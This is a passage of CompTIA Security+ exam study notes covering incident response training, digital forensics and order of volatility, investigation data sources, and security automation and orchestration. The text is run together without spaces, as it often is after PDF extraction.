+couldhavebeenaffected○ BenefitsofRootCauseAnalysis■ Identifiesvulnerabilitiesandweaknessesinsecuritypractices■ Createsmorerobustprotectionsagainstcyberthreats■ Encouragesano-blameculture,focusingonsolutionsandimprovementsrather
+
+thanassigningfault● No-BlameApproach○ RCAshouldnotassignblametoindividualsorteams
+
+360https://www.DionTraining.com
+
+## Page 361
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ Encouragesopenandhonestreportingtoimprovecybersecurity
+
+practices○ Recognizesthathumanerrorsoftenresultfromsystemicissues
+
+withinorganizations,suchastrainingproceduresorregulatory
+
+- versight
+● IncidentResponseTrainingandTesting○ Training■ Educationtoensureemployeesandstaffunderstandincidentresponse
+
+processes,procedures,andpriorities■ Trainingshouldbetailoredtodifferentroles(e.g.,firstresponders,managers,
+
+executives,endusers)withspecificneeds● Endusertrainingincludesteachingthemhowtoreportincidentsand
+
+remedialtrainingforthosewhomakemistakes■ Captureandincorporatelessonslearnedfrompreviousincidentsintotrainingto
+
+preventtheirrecurrence■ Softskillsandrelationshipbuildingareimportantinhigh-functioningincident
+
+responseteams○ Testing■ Practicalexerciseofincidentresponseprocedurestoensurethepractical
+
+applicationofknowledge■ Testinghelpsassesstheeffectivenessofyourresponseprocedures■ Itcanbecostly,complex,andresource-intensive,dependingonthescenario○ TabletopExercise(TTX)■ Atheoreticalexercisethatpresentsanincidentresponsescenario■ Discussionbased
+
+361https://www.DionTraining.com
+
+## Page 362
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ Participantsdiscussandrole-playtheirresponseactions■ Cost-effectivebutlackshands-onexperience■ Usefulforexploringdecision-makingandresponseplanning○ PenetrationTest(PenTest)■ Aredteam(attacker)attemptsnetworkintrusionbasedonaspecificthreat
+
+modelingscenario■ Rulesofengagementandclearmethodologyareestablishedbeforehand■ Populartoolsandoperatingsystems● Metasploit● CobaltStrike● KaliLinux● ParrotOS● CommandoOS■ Awarenessofthesetoolsiscrucial,astheycanbeusedbybothpenetration
+
+testersandattackers○ Simulation■ Goesbeyondtabletopdiscussions,involvingrealistic,hands-onscenarios■ Mimicsactualincidents● Simple○ Phishingattacks,○ Ransomwareinfections● Complex○ Multi-stageattacks○ Databreachesincoordinationwithexternalparties■ Teststechnicalskills,decision-makingunderpressure,andeffective
+
+communication
+
+362https://www.DionTraining.com
+
+## Page 363
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ Alignsimulationswiththeorganization'sthreatlandscapeandriskprofile■ Identifiesgapsinincidentresponseplans,improvesteamcoordination,and
+
+ensuresroleclarityduringrealincidents■ Regularlyincorporatingsimulationsimprovesanorganization'sreadinessfor
+
+cybersecurityincidents
+
+● DigitalForensicProcedures○ DigitalForensics■ Systematicprocessofinvestigatingandanalyzingdigitaldevicesanddatato
+
+uncoverevidenceforlegalpurposes○ FourMainPhasesofDigitalForensicProcedures■ Identification● Focusonscenesafety,preventionofevidencecontamination,andscope
+
+determination● Securethescene,preserveevidence,anddocumentthescene● Identifywhererelevantdatamightbestored(e.g.,tablets,smartphones,
+
+servers)■ Collection● Requiresproperauthorization(e.g.,warrant,executiveauthorization)● Orderofvolatility○ Dictatesthesequenceinwhichdatasourcesshouldbecollected
+
+andpreservedbasedontheirsusceptibilitytomodificationorloss○ Followingorderofvolatilityminimizesdataloss○ 5StepsofOrderofVolatility■ Collectdatafromthesystem’smemory■ Capturedatafromthesystemstate
+
+363https://www.DionTraining.com
+
+## Page 364
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ Collectdatafromstoragedevices■ Capturenetworktrafficandlogs■ Collectremotelystoredorarchiveddata● ChainofCustody○ Documentedandverifiablerecordthattracksthehandling,
+
+transfer,andpreservationofdigitalevidencefromthemomentit
+
+iscollecteduntilitispresentedinacourtoflaw● EvidenceCollectingtechniques○ Diskimaging■ Involvescreatingabit-by-bitorlogicalcopyofastorage
+
+device,preservingitsentirecontent,includingdeletedfiles
+
+andunallocatedspace○ FileCarving■ Focusesonextractingfilesanddatafragmentsfrom
+
+storagemediawithoutrelyingonthefilesystem■ Analysis● Examinetheforensicallysoundevidencecopy● Systematicallyscrutinizedataforrelevantinformation,timestamps,user
+
+interactions,andsignsofcriminalactivity● Followstrictproceduresanddocumentedprotocolsforconsistencyand
+
+- bjectivity■ Reporting● Documentmethods,toolsused,actionsperformed,findings,and
+conclusionsinafinalreport● Thereportservesascrucialevidenceinlegalproceedings,andthe
+
+forensicanalystmayneedtotestify
+
+364https://www.DionTraining.com
+
+## Page 365
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ AdditionalConcepts■ LegalHold● Issuedwhenlitigationisexpectedandpreservespotentiallyrelevant
+
+electronicdata● Ensuresevidenceisnottamperedwith,deleted,orlost● Requirestheimplementationofpreservationpracticestoprotectsystems
+
+andevidence■ E-Discovery(ElectronicDiscovery)● Processofidentifying,collecting,andpresentingelectronicallystored
+
+informationforpotentiallegalproceedings● Involvessearching,analyzing,andformattingelectronicdataforlitigation○ EthicalConsiderations■ Adherencetoacodeofethicsthatemphasizesavoidingbias,repeatableactions,
+
+andevidencepreservation● Avoidingbias○ Analysisshouldbeperformedwithoutbiasorprejudiceandbe
+
+basedsolelyontheevidence○ Useforensicanalystswhoareremovedfromthesituationtoavoid
+
+potentialbias● Repeatableactions○ Allanalysismustbebasedonrepeatableprocessesdocumented
+
+inthefinalreport○ Ensuringtheoriginalevidenceremainsunchangediscriticalto
+
+maintainingevidentiaryintegrity● Evidencepreservation○ Evidenceincludesboththedevice(e.g.,laptopharddisk)andthe
+
+365https://www.DionTraining.com
+
+## Page 366
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+datarecoveredfromit○ Performanalysisonadiskimage,nottheoriginaldrive,toprevent
+
+modificationsoralterations
+
+● DataCollectionProcedures○ DigitalForensicCollectionTechniques■ Involvemakingforensicimagesofdataforlateranalysis■ Thisapproachallowsincidentresponseteamstoresumeoperationsquickly
+
+whilemaintainingevidence■ Evidencemayberequiredforpotentiallegalactionandcooperationwithlaw
+
+enforcement○ Datacollectioninvolvesthefollowing■ Capturingandhashingsystemimages■ Analyzingdatawithforensictools● FTK(ForensicToolkit)● EnCase■ Capturingmachinescreenshots■ Reviewingnetworklogs■ CollectingCCTVvideo○ OrderofVolatility■ Guidesthesequenceofcollectingdata,frommostvolatile(CPUregistersand
+
+cache)toleastvolatile(archivalmedia)○ Licensinganddocumentationreviewsensuresystemconfigurationsalignwiththeir
+
+design○ DataAcquisition■ Themethodandtoolsusedtocreateaforensicallysoundcopyofdatafroma
+
+366https://www.DionTraining.com
+
+## Page 367
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+sourcedevice,suchassystemmemoryoraharddisk■ Policiesforbringingone’sowndevice(BYOD)complicatedataacquisition
+
+becauseitmaynotbelegallypossibletosearchorseizethedevices■ Somedatacanonlybecollectedoncethesystemisshutdownorthepoweris
+
+disconnected■ OrderofVolatility● CPUregistersandcachememory● Systemmemory(RAM),routingtables,ARPcaches,processtable,
+
+temporaryswapfiles● Dataonpersistentmassstorage● Remoteloggingandmonitoringdata● Physicalconfigurationandnetworktopology● Archivaldata■ WARNING● SomeWindowsregistrykeys,likeHKLM/Hardware,areonlyinmemory
+
+andrequireamemorydumptoanalyze
+
+367https://www.DionTraining.com
+
+## Page 368
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+InvestigatinganIncident
+
+Objective4.9:Givenascenario,youmustbeabletousedatasourcestosupportaninvestigation
+
+● InvestigatinganIncident○ DataSourcesforIncidentInvestigation■ DashboardsandAutomatedReports● Purpose○ Providehigh-levelinsights● Role○ Initialoverviewofthesecuritylandscape■ VulnerabilityScans● Purpose○ Identifysystemvulnerabilities● Role○ Foundationforunderstandingpotentialentrypoints■ PacketCaptures● Purpose○ Captureandanalyzenetworktraffic● Role○ Revealcommunicationpatternsandpotentialthreats■ Logs(VariousTypes)● FirewallLogs○ Monitornetworktraffic,detectunauthorizedaccess
+
+368https://www.DionTraining.com
+
+## Page 369
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● ApplicationLogs○ Recordapplication-specificevents,identifyabnormalbehavior● EndpointLogs○ Captureactivitiesonindividualdevices● OS-SpecificSecurityLogs○ Monitoroperatingsystemsecurityevents● IPSandIDSLogsandAlerts○ Trackintrusionattemptsandsystemcompromises● NetworkLogs○ Recordnetworkactivitiesandconnections● Metadata○ Providecontextualinformationaboutotherdatasources
+
+● InvestigativeData○ SIEM(SecurityInformationandEventMonitoringSystem)■ Real-timeanalysisofsecurityalertsfromapplicationsandnetworkhardware■ Combinationofdifferentdatasourcesintoonetool■ Providesaconsolidatedviewofnetworkactivity■ Allowsfortrendanalysis,alertcreation,andcorrelationofdata■ Considerations● Sensors● Sensitivity● Trends● Alerts● Correlation
+
+369https://www.DionTraining.com
+
+## Page 370
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ LogFiles■ Recordseventsandmessagesinoperatingsystems,software,andnetwork
+
+devices■ Includesnetwork,system,application,security,web,DNS,authentication,dump
+
+files,VoIP,andcallmanagers○ Syslog,Rsyslog,Syslog-ng■ Toolsforcentralizinglogdatafromdifferentsystemsintoarepository■ CommonlyusedtofeeddataintoSIEM○ JournalCTL■ Linuxcommand-lineutilityforqueryinganddisplayinglogsfromtheJournal
+
+Daemon(SystemD'sloggingservice)○ NXLog■ Multi-platform,open-sourcelogmanagementtool■ Identifiessecurityrisksandanalyzeslogsfromserver,OS,andapplications○ NetFlow■ NetworkprotocolforcollectingactiveIPnetworktrafficdata■ Providesinformationonsource,destination,volume,andpaths○ SFlow(SampledFlow)■ Open-sourcealternativetoNetFlow■ Exportstruncatedpacketsandinterfacecounterfornetworkmonitoring○ IPFIX(InternetProtocolFlowInformationExport)■ UniversalstandardforexportingIPflowinformation■ Usedformediation,accounting,andbillingbydefiningdataformatforexporters
+
+andcollectors○ Metadata■ Datathatdescribesotherdata
+
+370https://www.DionTraining.com
+
+## Page 371
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ Usefulforunderstandingdetailsaboutevents,calls,emails,webvisits,andfiles
+
+duringinvestigations■ UseCasesforMetadata● Email○ Analyzemetadataforphishingcampaigns● Mobile○ Reviewdatatransfer,callduration,andcontacts
+
+● Web○ Determinewebsitevisitsanduserbehavior● File○ Examinefiledetails,suchascreationtimeandviewerstatistics
+
+● Dashboards○ Dashboards■ Graphicaldisplaysofinformationacrossmultiplesystems○ SinglePaneofGlass■ Asinglescreenforanalyststoaccesseverythingacrosstheorganization○ Splunk■ Abigdataplatformforingestingvarioustypesofdata,includingsecurityand
+
+incidentresponsedata■ Collectsdatafromfirewalls,applications,endpoints,operatingsystems,intrusion
+
+detectionsystems,intrusionpreventionsystems,antivirussoftware,and
+
+networks○ Dashboardshelpanalyzetrendsovertimeandinformactions○ Usethedashboardasacentralstartingpointforinvestigationsandincidentresponse
+
+371https://www.DionTraining.com
+
+## Page 372
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● AutomatedReports○ AutomatedReports■ Generatedbycomputersystemstoprovideinformationaboutvariousaspectsof
+
+anetwork'ssecurity■ Commonsourcesareantivirussoftware,endpointdetectionresponse
+
+capabilities,andothersecuritytools○ AutomatedSecurityIncidentReportKeyElements■ ReportID● Auniqueidentifierforthereport■ Generationdate● Thedatethereportwasgenerated■ Reportperiod● Thetimeframecoveredbythereport■ “Preparedby”● Theentityresponsibleforcreatingthereport■ ExecutiveSummary● Providesabriefoverviewofthereport'scontent,helpingreaders
+
+determineitsrelevance■ IncidentAlerts● Canbecategorizedintodifferentlevels○ Critical○ High○ Moderate○ Informational
+
+372https://www.DionTraining.com
+
+## Page 373
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ IncidentDetails● Timestamps● Useraccounts● Affectedsystems● Incidentdescriptions● Actionstaken○ Automatedresponsescanincludesuspendinguseraccounts,
+
+blockingIPaddresses,andresettingpasswords○ Outboundtrafficandsoftwareinstallationsmaytriggeralerts,
+
+whichrequireinvestigationtodeterminetheirnatureand
+
+potentialsecurityimplications■ IncidentAnalysis● Mayincludethreattrends,userbehavior,anddataflowanomalies■ SecurityRecommendations● Suggestactionstoaddressidentifiedsecurityissues■ Conclusion● Summaryofthereport'sfindingsandcontainsoutlinesofanyfurther
+
+actionstobetaken■ Appendices● Mayincludelogsnippets,IPaddresses,domains,orotherrelevantdata○ Automationandorchestrationenablereal-timeresponsestosecurityincidents,helping
+
+topreventmajorsecuritybreachesandnetworkoutages
+
+● VulnerabilityScans○ VulnerabilityScanReport■ Generatedautomaticallyaftercompletingavulnerabilityscan
+
+373https://www.DionTraining.com
+
+## Page 374
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ Analysisofthereportisessentialtoconfirmthevalidityofidentified
+
+vulnerabilities○ FalsePositives■ Vulnerabilityscannersmayproducefalsepositives,meaningtheyreport
+
+vulnerabilitiesthatdon'tactuallyexistonyoursystem■ Itiscrucialtodifferentiaterealvulnerabilitiesfromfalsepositives○ AnalysisofVulnerabilities■ Foreachidentifiedvulnerability,assesswhetheritwasdetectedbythescanner
+
+andifitexistsonyoursystem■ Determinetheseverityandcriticalityofeachvulnerability■ Createaplanofactionandmilestonesforremediation○ ComponentsofaVulnerabilityScanReport■ ReportID■ ScanDateandTime■ SystemorSoftwareVersion■ ScanInitiator● Thepersonwhoranthescan■ ExecutiveSummary● Highlightsthemesandtrendsforlargenetworks■ Vulnerabilities–listedbyseverity(critical,high,medium,low,informational)or
+
+byhosts● CVE(CommonVulnerabilityandExposure)ID–VulnerabilityID○ CVEwebsite(cve.org)containsdetailedinformationabout
+
+vulnerabilities● Description● Affectedsystem
+
+374https://www.DionTraining.com
+
+## Page 375
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● Impact● CommonVulnerabilityScoringSystem(CVSS)Score○ Measuresseverity● RemediationRecommendations■ AdditionalFindings■ Recommendations■ Conclusion
+
+● PacketCaptures○ PacketCapture■ Capturesdatagoingtoorfromanetworkdevice■ Canbesetuponaspanporttocapturealldatagoingtoandfromdevicesonthe
+
+network■ Packetcapturesinexamaretypicallyshortsnippets,notmassivedatadumps○ PacketCaptureColumns■ Number● Packetsequencenumberinthecapture■ Time● Elapsedtimesincethecapturestarted■ Source/DestinationIPAddresses● Showwherethedataiscomingfromandgoingto■ Protocol● TypicallyTCPorUDP■ Length● Thesizeofthepacket
+
+375https://www.DionTraining.com
+
+## Page 376
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ Info● Providesinformationfromthepacketheader,includingflags,sequence,
+
+window,length,MSS,sourceport,anddestinationport○ Lookforpatternsthatindicateattacktypes,suchasSYNfloodsorDDoSattacks○ ConsidertherelationshipbetweensourceanddestinationIPaddressestoidentifythe
+
+typeofattack
+
+● Metadata○ Metadata■ Informationaboutafile,application,orotherdata○ MD5/SHA256Checksum■ Servesasuniquedigitalfingerprintforfileidentification,includingpotential
+
+malware
+
+376https://www.DionTraining.com
+
+## Page 377
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+AutomationandOrchestration
+
+Objective4.7:Explaintheimportanceofautomationandorchestrationrelatedtosecureoperations
+
+● AutomationandOrchestration○ Automation■ Executionoftaskswithoutmanualintervention■ Purpose● Consistency,efficiency,reductionofhumanerror■ Example● Scriptingrepetitivetasks○ Orchestration■ Coordinatedexecutionofmultipleautomatedtasksforaspecificoutcomeor
+
+workflow■ Purpose● Ensurestasksworktogetherharmoniously■ Example● Sequencingtasksinincidentresponse○ SOAR(SecurityOrchestration,Automation,andResponse)■ Classofsecuritytoolsforincidentresponse,threathunting,andsecurity
+
+configurations■ Purpose● Orchestrateandautomaterunbooks,deliverdataenrichment■ Example● IntegratingSIEMandSOARforadvancedsecuritycapabilities
+
+377https://www.DionTraining.com
+
+## Page 378
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ Playbook■ Checklistofactionsfordetectingandrespondingtoaspecificincident■ Role● Guidesincidentresponseprocesses■ Example● Stepsforrespondingtoaphishingcampaign○ Runbook■ Automatedversionofaplaybookwithdefinedinteractionpointsforhuman
+
+analysis■ Role● Executesautomatedtaskswithhumandecisionpoints■ Example● Automatedincidentresponsewithanalystdecisionpoints○ BenefitsofAutomationandOrchestration■ Efficiency● Time-savingandconsistentexecution■ Standardization● Enforcesbaselinesandstandardizedconfigurations■ Scalability● Scalessecurelyandefficiently■ EmployeeRetention● Reducesrepetitivetasks■ ReactionTime● Fasterresponsestoincidents■ WorkforceMultiplier● Maximizeshumanresources
+
+378https://www.DionTraining.com
+
+## Page 379
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● WhentoAutomateandOrchestrate○ AutomationandOrchestration■ Effectiveautomationandorchestrationareforrepeatableandstabletasksand
+
+workflows■ Identifyconsistentprocessesinyourorganizationforautomationand
+
+- rchestration○ Decisionfactorsforimplementingautomationandorchestration■ Complexity● Automationandorchestrationaresuitableforcomplex,repetitivetasks● Determineprocesscomplexitytodecidewhethertoautomateor
+- rchestrate● Routinebackupsaresuitableforautomation,whilecomplexincident
+responserequiresorchestration■ Cost● Initialinvestmentisakeyfactor● Conductacost-benefitanalysisconsideringdevelopment,
+
+implementation,andmaintenancecosts● Includehardware,software,personnel,andsupportcostsintheanalysis● Costsavingsoftenoutweightheinitialinvestmentinthelongrun■ SinglePointsofFailure● Implementbackupsystemsormanualprocessestomitigatesinglepoints
+
+- ffailure● Redundancyandfailovermechanisms,bothtechnicalandmanual,can
+ensureuninterruptedoperations
+
+379https://www.DionTraining.com
+
+## Page 380
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ TechnicalDebt● Technicaldebtisthecostandcomplexityofsuboptimalsoftware
+
+solutions● Regularreviewsandupdatesarenecessarytoavoidtechnicaldebt● Technicaldebtcanimpedeefficiencyandsecurity■ Ongoingsupportability● Automationandorchestrationsystemsneedongoingmaintenanceand
+
+adaptation● Teamsmustpossessthenecessaryskillstomaintainandadaptthese
+
+systems● Trainingandskilldevelopmentareessential● MostautomationdependsontheconnectionofsystemsviaAPIsand
+
+webhooks
+
+● BenefitsofAutomationandOrchestration○ IncreasedEfficiencyandTimeSavings■ Automationreducesmanualtasks■ Repetitiveprocesses,likepatchingandbackups,canrunseamlesslywithout
+
+humanintervention■ Freesuphumanresourcesandreducestheriskoferrors■ Increasesreliabilityandconsistencyinprocesses○ EnforcementofBaselines■ Consistentlyenforcessecurityandcompliancebaselines■ Definesstandardizedconfigurationsandpolicies■ Ensuressystemsalignwithindustrybestpracticesandregulatoryrequirements■ Minimizesvulnerabilitiesandsecuritybreachrisks
+
+380https://www.DionTraining.com
+
+## Page 381
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ ImplementationofStandardInfrastructureConfigurations■ Facilitatesthecreationandenforcementofstandardconfigurations■ Ensuresconsistentsetupofallsystems■ Detectsdeviationsfromestablishedstandardsandtriggersautomatedcorrective
+
+action○ SecureScaling■ EnablessecurescalingofITinfrastructureasorganizationsgrow■ Dynamicallyscalesresourceswhileadheringtosecurityprotocols■ Provisioningvirtualmachines,addingnetworkresources,andaccesscontrol
+
+adjustmentsaredonesecurely○ IncreasedEmployeeRetention■ Empowersemployeestofocusonstrategicandcreativeaspectsoftheirroles■ Reducesrepetitiveandmundanetasks■ Increasesjobfulfillmentandengagement■ Reducestheriskofburnout,contributingtohigherretentionrates○ FasterReactionTimes■ Facilitatesrapidresponsetosecurityincidentsandthreats■ Automationandorchestrationsystemsarealwaysavailable■ Automatesintrusiondetection,threatanalysis,andincidentresponse■ Real-timealertsandpredefinedresponseactionsenhancesecurity○ WorkforceMultiplier■ Augmentsexistingstaff'scapabilities■ Smallerteamscanmanagelarger,morecomplexinfrastructures■ Reducesstaffingneedsandoptimizesresourceallocationforcostsavings
+
+381https://www.DionTraining.com
+
+## Page 382
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● AutomatingSupportTickets○ AutomatingSupportTicketManagement■ EnhancesITandcustomersupportteamefficiency■ Streamlinesissueresolutionandimprovescustomersatisfaction■ Supportticketmanagementiscriticalforaddressingissues,incidents,andservice
+
+requests■ Highticketvolumecanleadtodelays,increasedworkloads,anddecreased
+
+customersatisfaction○ AutomatingSupportTicketCreation■ Sixstepsintheticketcreationprocess● Userssubmitrequeststhroughchannels(e.g.,email,webform,support
+
+portal)● Automationtoolgeneratesticketsbasedonpredefinedcriteria● Captureessentialinformationfromusersubmissions● Categorizeticketsbasedoncontentorsource● Assignprioritybasedonpredefinedrulesandcriteria● Automatednotificationsenttorelevantsupportteamortechnician■ BenefitsofAutomatingTicketCreation● Ensuresefficientcapture,categorization,andassignmentofsupport
+
+requests● Reducestheriskoflostoroverlookedtickets● Acceleratesresponsetimetouserneeds○ TicketEscalationAutomation■ Ticketescalationaddressescomplexorhigh-priorityissues■ Followsafive-stepprocess● Defineescalationcriteriabasedonissuenature,urgency,andservice
+
+382https://www.DionTraining.com
+
+## Page 383
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+levelagreements● Createautomationrulestomonitorticketattributesandtrigger
+
+escalation● Performpredefinedescalationactions(e.g.,notification,reassignment,
+
+changeinpriority)● Monitorandtracktheescalatedticket'sprogress● Resolveandclosetheticket,triggeringnotificationtotheuser■ BenefitsofAutomatingTicketEscalation● Ensuresprompthandlingofcriticalissues● Maintainstransparencyandaccountabilityinthesupportprocess● Helpsmeetservicelevelagreementsandminimizedelaysinaddressing
+
+urgentmatters
+
+● AutomatingOnboarding○ Automation■ Involvesusingtechnologytoexecuterepetitivetaskswithoutcontinuoushuman
+
+intervention○ Automatingtheonboardingprocessimpactsorganizationalproductivity,employee
+
+satisfaction,andretentionrates■ Streamliningonboardingensuresnewhiresareintegratedquicklyandefficiently
+
+intotheirrolesandtheorganization'sculture■ Benefits● Eliminatesmanualtasks,reduceserrors,andprovidesstructured,
+
+consistentonboarding● ReducesadministrativeburdenonHRandITdepartments● Enhancessupportticketmanagementprocesses
+
+383https://www.DionTraining.com
+
+## Page 384
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ AreastoAutomateinOnboarding■ Creationofdocumentationrecords■ Schedulingtraining■ Provisioningequipment■ Managingaccessrights■ Distributingchecklists■ Collectingfeedback○ UserProvisioning■ Involvescreatingandmanaginguseraccountsandaccessrights■ Ensuresnewemployeeshavenecessaryaccesstosystems,applications,and
+
+resources■ Processincludesthefollowing● Collectinginformation● Creatingaccounts● Assigningrolesandaccess● Sendingnotifications● Conductingsynchronizationandupdates■ StepsinUserProvisioning● Employeeprovidespersonaldetails,role,anddepartmentinformation● Automationcreatesuseraccountsinvarioussystems● Automationassignsrolesandaccesslevelsbasedondepartmentand
+
+position● Automatednotificationssenttotheemployee,manager,orIT
+
+department● Automationkeepsuserinformationsynchronizedacrossplatforms
+
+384https://www.DionTraining.com
+
+## Page 385
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ ResourceProvisioning■ Ensurestimelyallocationofphysicalanddigitalresourcesneededbynew
+
+employees■ Resourcesinclude● Workstations● Softwarelicenses● Communicationtools■ Processinvolves● Requirementsanalysis● Resourceallocation● Configuration● Verificationandauditing● Gatheringfeedback■ StepsinResourceProvisioning● Analyzeroleanddepartmentinformationtodeterminespecificresources● Initiateprocurementworkflowsorallocateavailableresourcesbasedon
+
+rules● Configureresourcestomeettheemployee'srole● Verificationprocesstoensuresuccessfulallocation● Auditingtotrackallocatedresourcesforinventorymanagementand
+
+compliance● Employeeandmanagerfeedbackonresourcesuitabilityandadditional
+
+requirements
+
+385https://www.DionTraining.com
+
+## Page 386
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● AutomatingSecurity○ AutomatingSecurity■ Helpspreventsecurityvulnerabilities,respondtothreatsswiftly,andmaintain
+
+consistentsecuritypolicies■ Itinvolvesusingtechnologytoperformcrucialbutrepetitivesecuritytasksto
+
+maintainupdateddefensesandswiftresponsetosecuritythreats■ Automationincludestheuseandconfigurationofguardrails,securitygroups,
+
+serviceaccessmanagement,andpermissions○ WaystoAutomateSecurity■ ImplementingGuardrails● Guardrailsareautomatedsafetycontrolstoprotectagainstinsecure
+
+infrastructureconfigurations● Configuredaccordingtosecuritystandardsandenforcesecuritypolicies
+
+automatically● Continuouslymonitorinfrastructure,detectsecurityviolations,andtake
+
+predefinedcorrectiveactions■ ManagingSecurityGroups● Securitygroupsactasvirtualfirewallsforcloud-basedserverinstances● Specifyallowedincomingandoutgoingnetworktrafficusingpredefined
+
+rules● Automateassignmentofinstancestoappropriatesecuritygroups● Dynamicallyadjustsecuritygroupconfigurationstorespondtoevolving
+
+threats● Analyzetrafficforunauthorizedaccessattempts■ EnablingandDisablingServicesandAccess● Automateserviceaccessmanagementtopreventunnecessaryrisksand
+
+386https://www.DionTraining.com
+
+## Page 387
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+maintainoperationalefficiency● Regularlyreviewandmanageaccesstoservices● Monitorforunusualactivityandautomaticallyrestrictordisableaccessif
+
+suspicious● Enableordisableservicesbasedonapredefinedschedulewhennot
+
+continuouslyneeded■ AutomatingPermissionsManagement● ManagepermissionsusingRole-basedAccessControls(RBAC)● Automateprovisioningandde-provisioningofaccessrightsbasedon
+
+assignedroles● Ensurenounauthorizedaccesstosensitiveinformation● Performregularchecksonpermissionssettingstoverifycompliancewith
+
+policiesandregulations● Makenecessaryadjustmentsovertimetomaintainsecurity
+
+● AutomatingApplicationDevelopment○ AutomatingApplicationDevelopment■ Enhancesefficiency,consistency,andthequalityofsoftwareproducts■ Automation● Inapplicationdevelopment,itinvolvesusingtechnologytomanage,test,
+
+anddeployapplicationswithminimalhumanintervention○ ContinuousIntegrationandContinuousDeployment(CI/CD)significantlyimprove
+
+softwareefficiency,consistency,andquality■ ContinuousIntegration(CI)● Developersmergecodechangesfrequentlyinacentralrepository● Automatedbuildprocessverifieseachcheck-inanddetectsproblems
+
+387https://www.DionTraining.com
+
+## Page 388
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+duringintegration● Automationtoolsmanagecodeintegration,providenotificationsfor
+
+conflictsorerrors● Automatedtestsensuresoftwarequalityafterintegration● Developersreceivefeedbackondetectedissuestomakenecessary
+
+corrections● Release○ Processoffinalizingandpreparingnewsoftwareorupdates○ Enablingsoftwareinstallationandusage● Deployment○ Involvesautomatedprocessofsoftwarereleasestousers○ Actualinstallationofsoftwareinanewenvironment■ ContinuousIntegrationandContinuousDelivery(CI/CD)● CI/CDincludescontinuousintegration● ContinuousDelivery(CD)ensurescodeisalwaysdeployableafterevery
+
+change○ Automatedtestingandbuildprocesses○ CDstopsshortofautomaticproductiondeployment○ CDispartofthereleaseprocess○ Fulldeploymentprocessisautomatedonlytoacertainstage■ Doesn’tdeployintotheproductionenvironment
+
+automatically○ Deploymenttoproductionenvironmentisamanualbusiness
+
+decision○ Allowsflexibilityintiming,marketconditions,andstakeholder
+
+readiness
+
+388https://www.DionTraining.com
+
+## Page 389
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ ContinuousDeployment● TakesCI/CDfurtherbyautomaticallydeployingcodechangestotesting
+
+andproductionenvironments● Allchangespassingthroughtheproductionpipelinearefullyreleased
+
+withnohumanintervention● Automationensuresconsistentdeployments,fasterreleases,andoffers
+
+rollbackcapabilities● Requiresaparadigmshift,moredeveloperinvolvementinthe
+
+deploymentprocess● Promotesincreasedcommunicationandcollaborationwithinteamsfor
+
+collectiveresponsibility■ BenefitsofCI/CD● Adaptingtochangingmarketdemandsmorequickly● Efficientworkflowfromdevelopmenttodeployment● Improvescodequality,streamlinesdeploymentprocesses,andallows
+
+flexibleproductionrelease● Reducesdeploymentrisksandenhancessoftwarereliability
+
+● IntegrationsandAPIs○ Integration■ Combiningsubsystemsorcomponentsintoasingle,functioningsystem○ API(ApplicationProgrammingInterface)■ Setofrulesandprotocolsusedforbuildingandintegratingapplicationsoftware■ Enablesoftwaredeveloperstoaccessfunctionsorfeaturesofanother
+
+applicationprogrammatically
+
+389https://www.DionTraining.com
+
+## Page 390
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ APICommunication■ APIsfacilitatecommunicationbetweendifferentpartsofamicroserviceor
+
+service-orientedarchitecture■ Allowsautomationofadministration,management,andmonitoringofservices
+
+andcloud-basedinfrastructures■ CommoncommunicationmethodsusedbyAPIs● REST(RepresentationalStateTransfer)○ RESTusesstandardHTTPmethods,statuscodes,URIs,andMIME
+
+typesforinteractions○ PrimarilyusesJSONfordatatransfer○ Lightweightprotocolsuitableforintegratingwithexistingwebsites● SOAP(SimpleObjectAccessProtocol)○ SOAPhasastructuredmessageformatinXML○ Knownforrobustness,additionalsecurityfeatures,and
+
+transactioncompliance○ Suitableforenterprise-levelwebserviceswithcomplex
+
+transactionsandregulatorycompliancerequirements○ BenefitsofAPIIntegrations■ Improvedefficiencyandconsistency■ Allowsdirectintegrationofthird-partyapplicationsintowebapplications■ Reducestheneedtobuildentireservicesfromscratch○ APITestingwithCURL■ CURL● Atoolfortransferringdatatoorfromaserverusingvarioussupported
+
+protocols■ CommonlyusedprotocolsforAPItestingareHTTPandHTTPS
+
+390https://www.DionTraining.com
+
+## Page 391
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ UseCURLtosenddatatoanAPIandreceivearesponsefortesting■ CURLallowssendingdatatoanAPIandreceivingaJSONresponse■ Helpfulforsoftwaredevelopersandcybersecurityprofessionals,especiallyin
+
+penetrationtestingscenarios
+
+391https://www.DionTraining.com
+
+## Page 392
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+SecurityAwareness
+
+Objective5.6:Givenascenario,youmustbeabletoimplementsecurityawarenesspractices
+
